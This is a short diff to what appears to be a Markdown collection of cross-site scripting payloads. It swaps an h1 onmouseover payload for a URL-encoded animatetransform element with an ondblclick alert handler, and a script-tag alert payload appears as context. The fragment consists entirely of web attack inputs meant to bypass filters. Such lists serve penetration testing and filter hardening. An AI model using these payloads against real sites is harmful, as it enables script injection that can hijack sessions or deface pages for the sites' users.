@@ -73,7 +73,7 @@ onMouseOver=<script>alert("/XSS BY Y000!/")</script>
 ### 
 
 ```
-</script><h1 onmouseover= (((confirm)))`_Y000!_`>
+%3canimatetransform%20ondblclick%3d%22alert(1)%22%20autofocus%20tabindex%3d1%20style%3ddisplay%3ablock%3etest%3c%2fanimatetransform%3e
 ```
 ### 
 
